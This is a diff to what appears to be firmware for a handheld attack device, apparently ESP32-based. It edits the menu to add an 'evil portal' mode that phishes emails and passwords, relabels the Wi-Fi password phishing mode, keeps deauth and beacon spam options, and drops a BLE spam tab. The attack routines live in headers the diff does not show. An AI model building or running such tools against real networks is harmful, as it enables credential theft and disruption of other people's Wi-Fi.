@@ -5,12 +5,13 @@
 #include "deauth.h"
 #include "flappy_bird.h"
 #include "ir_controll.h"
+#include "evil_portal.h"
 
-const char* tabsMenu[] = { "Settings", "WiFi", "Games", "IR", "BLE Spam"};
+const char* tabsMenu[] = { "Settings", "WiFi", "Games", "IR"};
 const short tabsLength = sizeof(tabsMenu) / sizeof(tabsMenu[0]);
 short selectedItemTab = 0;
 
-const char* wifiMenu[] = { "Scan", "Connect", "Deauth selected", "Deauth all", "Fishing", "BeaconSpam", "Back"};
+const char* wifiMenu[] = { "Scan", "Connect", "Deauth selected", "Deauth all", "Fishing Wi-Fi", "Fishing Email", "BeaconSpam", "Back"};
 const short wifiLength = sizeof(wifiMenu) / sizeof(wifiMenu[0]);
 short selectedItemWifi = 0;
 short wifiMenuScroll = 0;
@@ -29,6 +30,8 @@ const short settingsLength = sizeof(settingsMenu) / sizeof(settingsMenu[0]);
 short selectedItemSettings = 0;
 
 short currentTab = 0;
+
+String network_name = "";
 
 void drawMenu() {
   display.clearDisplay();
@@ -99,13 +102,6 @@ void handleMenuSelect() {
         currentTab = 2;
       } else if (selectedItemTab == 3) {
         currentTab = 3;
-      } else if (selectedItemTab == 4) {
-    
-      display.clearDisplay();
-      display.setCursor(0, 0);
-      display.println("Start | BLE Spam...");
-      display.display();
-      wait_for_stop();
       }
       break;
 
@@ -115,7 +111,8 @@ void handleMenuSelect() {
         selectedItemWifi = 0;
         wifiMenuScroll = 0;
       } else {
-        switch (selectedItemWifi) {
+       switch (selectedItemWifi) {
+        
           case 0:
             display.clearDisplay();
             display.setCursor(0, 0);
@@ -158,6 +155,7 @@ void handleMenuSelect() {
             display.clearDisplay();
             display.setCursor(0, 0);
             display.println("Start | Fishing...");
+            display.println("Mode: Wi-Fi passwords");
             display.display();
 
             handshake_menu = true;
@@ -166,12 +164,25 @@ void handleMenuSelect() {
           case 5:
             display.clearDisplay();
             display.setCursor(0, 0);
+            display.println("Start | Fishing...");
+            display.println("Mode: Email and passwords");
+            display.display();
+
+            server.stop();
+            delay(200);
+
+            start_input(&network_name);
+            startCaptivePortal(&network_name, true);
+            wait_for_stop();
+            break;
+          case 6:
+            display.clearDisplay();
+            display.setCursor(0, 0);
             display.println("Start | BeaconSpam...");
             display.display();
 
             delay(200);            
             beacon_spam_state = true;
-            String network_name = "";
             start_input(&network_name);
             initBeaconSpam(&network_name);
             wait_for_stop();
